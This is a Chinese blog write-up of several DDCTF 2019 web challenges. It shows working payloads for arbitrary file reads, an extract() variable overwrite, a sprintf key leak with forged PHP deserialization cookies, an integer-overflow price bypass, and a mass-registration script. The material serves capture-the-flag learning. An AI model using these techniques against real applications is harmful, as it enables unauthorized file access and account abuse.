---
title: DDCTF 部分题目 Writeup
date: April 19th 2019
tags: [CTF, Writeup, PHP, 反序列化]
summary: DDCTF 部分 Web 赛题 Writeup，包含 Base64 多重解码读取任意文件、PHP 反序列化等漏洞的完整利用过程记录。
---

# DDCTF 部分题目 Writeup

*这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。*

## Web - 滴~

地址：[http://117.51.150.246/](http://117.51.150.246/)

BASE64解码两次jpg参数的值：666C61672E6A7067

再经过一次16进制转字符串：flag.jpg

可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。

尝试读取index.php:

`http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`

页面返回得到data协议里的经过BASE64处理后的数据，解码后得到源码：

```php

<?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);

header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09');
$file = hex2bin(base64_decode(base64_decode($_GET['jpg'])));
echo '<title>'.$_GET['jpg'].'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
echo $file.'</br>';
$file = str_replace("config","!", $file);
echo $file.'</br>';
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";
/*
 * Can you find the flag file?
 *
 */

?>

```

这里可以看到，$file经过的处理步骤为：

1. jpg参数的值经过两次base64加密，一次进制转换。
2. 使用preg_replace()函数将除了字母数字外的字符删除
3. 将变量中config替换为!

题目中还给了提示`https://blog.csdn.net/FengBanLiuYun/article/details/80616607`

看了之后我一直以为是要绕过preg_replace()提交一个`\b`来构造参数值来读取config.php，无果。

后来经过别人提示才知道，博客的博主的另外一篇帖子提到的[vim 异常退出 swp文件提示](https://blog.csdn.net/FengBanLiuYun/article/details/80913909)

读取practice.txt.swp:

`http://117.51.150.246/index.php?jpg=TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0=`

获得了一个文件名：f1ag!ddctf.php 访问后发现没有东西，直接读这个文件的源码：

emmm,发现`f1ag!ddctf.php`被过滤成`f1agddctf.php`，因为str_replace()会把config替换为!，所以就直接把读取的文件名设为`f1agconfigddctf.php`，成功读取到源码：

`http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==`

```php
<?php
include('config.php');
$k = 'hello';
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
	{
		echo $flag;
	}
	else
	{
		echo'hello';
	}
}

?>
```

变量覆盖，判断变量uid和文件名为变量k的文件内容是否相同。

一开始想着应该是弱类型，但后来发现不是。

如果文件不存在的话，读取到的内容就为空，所以uid赋值为空，k为一个不存在的文件名，访问：

`http://117.51.150.246/f1ag!ddctf.php?uid=&k=333`

得到Flag。

(因为网站存在robots.txt，内容为`excuse me?`， 我尝试访问：`http://117.51.150.246/f1ag!ddctf.php?uid=excuse%20me?&k=robots.txt` 不知道为什么不成功)

## Web - WEB签到题

题目地址：[http://117.51.158.44/](http://117.51.158.44/)

网页提示：`抱歉，您没有登陆权限，请获取权限后访问-----`

发现，弹出`需要授权`，他提示该网站称：`restricted username`

尝试了几个弱口令，不行。

在index.php页面的源码中发现了一个js：`http://117.51.158.44/js/index.js`

```js
/**
 * Created by PhpStorm.
 * User: didi
 * Date: 2019/1/13
 * Time: 9:05 PM
 */

function auth() {
    $.ajax({
        type: "post",
        url:"http://117.51.158.44/app/Auth.php",
        contentType: "application/json;charset=utf-8",
        dataType: "json",
        beforeSend: function (XMLHttpRequest) {
            XMLHttpRequest.setRequestHeader("didictf_username", "");
        },
        success: function (getdata) {
           console.log(getdata);
           if(getdata.data !== '') {
               document.getElementById('auth').innerHTML = getdata.data;
           }
        },error:function(error){
            console.log(error);
        }
    });
}
```

给`http://117.51.158.44/app/Auth.php`发了一个POST请求，并且http头包含`didictf_username`

用Brupsuite包含`Didictf_Username: admin`像Auth.php提交一个POST请求,返回：

`{errMsg:success,data:您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php}`

访问`http://117.51.158.44/app/fL2XID2i0Cdh.php`得到两份PHP代码，看来是又要审计？

将源码理了一下，之后搜索到了[Codeigniter 利用加密Key（密钥）的对象注入漏洞](https://juejin.im/post/5aa1154d6fb9a028de4448d2)

读完文章之后的思路就是：

1. 拿到eancrykey
2. 通过反序列化修改$this->path
3. 读取flag

源码中可以看到eancrykey是通过读取`../config/key.txt`得到的，后面存在一个判断：

```php
if(!empty($_POST["nickname"])) {
    $arr = array($_POST["nickname"],$this->eancrykey);
    $data = "Welcome my friend %s";
    foreach ($arr as $k => $v) {
        $data = sprintf($data,$v);
    }
    parent::response($data,"Welcome");
}
```

这里使用POST提交`nickname=123 %s`.(需要将添加cookie值)

因为这里$data变量经过了两次sprintf处理，只有在值里面添加s%，才能把eancrykey读出来。

eancrykey的值为：`EzblrbNS`, 当时的截图：

![eancrykey](https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg)

根据文章里面的方法，构造反序列化的payload，源码为：

```php
<?php
class Application {
        public function __construct() {
                $this->path = "....//config/flag.txt";
        }
}

$session = serialize(new Application);
echo $session;

$private_key = 'EzblrbNS';
echo md5($private_key.$session);
?>
```

生成的payload为：`O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525` (记得将payload url编码)

flag的地址是因为源码中的提示：`eancrykey  and flag under the folder`, 又因为$path会经过处理，会将”../“删除，所以双写”../“。最后发现path的长度刚刚18。

将cookie值改为payload，就可以读取到flag。

## Web - Upload-IMG

这里考了一个没有接触过的点，二次渲染。

这里上传的是一个JPG文件，先把jpg上传然后保存下来。

使用脚本直接跑一下JPG图片，再次上传得到Flag。

脚本来自：[https://paper.tuisec.win/detail/39553671bf72998](https://paper.tuisec.win/detail/39553671bf72998)

生成payload_jpg:

![xuanran](https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg)

得到Flag：

![xuanran](https://i.loli.net/2019/04/19/5cb9c9ab02154.jpg)

## Web - 复现 - 大吉大利,今晚吃鸡~

题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~

发现只有100元，但买票需要2000元。

我当时尝试过修改价钱，没绕过去，看了wp之后才知道是用整数溢出来绕过。

购买链接为：`/ctf/api/buy_ticket?ticket_price=2000`

将ticket_price修改为：4294967297 (在32位系统下，所有无符号整数的数量是2^32=4294967296)

提交，然后支付，购买成功并且只花了一元钱。

在游戏里面提示：通过提交正确id与ticket来移除对手

这里需要写一个脚本，批量注册，购买入场票，获得ID和ticket。然后用这个账户来移除。

这里借用一个大佬的脚本：

```python
import requests
import json
import re
import random
import time
X = requests.Session()
X.get("http://117.51.147.155:5050/ctf/api/register?name=admintest4&password=admintest")
cnt = 0
i = 0
while(True):
    i+=1
    # time.sleep(0.1)
    R = requests.Session()
    # reg
    reg_res = R.get("http://117.51.147.155:5050/ctf/api/register?name=Sndav0{}&password=12345678".format(i))
    # if "200" in reg_res.text:
    #     # print("Sndav{} is registed pass:12345678".format(i));
    buy_res = R.get("http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967299")    
    try:
        bill_id = json.loads(buy_res.text)
        bill_id = bill_id['data'][0]['bill_id']
        # print("billid:"+bill_id);
        buy2_res = R.get("http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={}".format(bill_id))
        # print(json.loads(buy2_res.text)[u'code'])
        # get_token
        token_res = R.get("http://117.51.147.155:5050/ctf/api/search_ticket")
        js = json.loads(token_res.text)['data'][0]
        # print(js)
        id = js['id']
        ticket = js['ticket']
        print(id,ticket)
        X.get("http://117.51.147.155:5050/ctf/api/remove_robot?id={}&ticket={}".format(id,ticket))
        print(X.get("http://117.51.147.155:5050/ctf/api/get_flag").text)
        cnt+=1
    except:
        pass
```

直接跑，返回：

```plain
141 c8f034432be513ace9e8452f8af78d89
{"code":200,"data":["DDCTF{chiken_dinner_hyMCX[n47Fx)}"],"msg":"\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21"}
```

这题的收获应该是了解了整数溢出，后面也可以总结一下。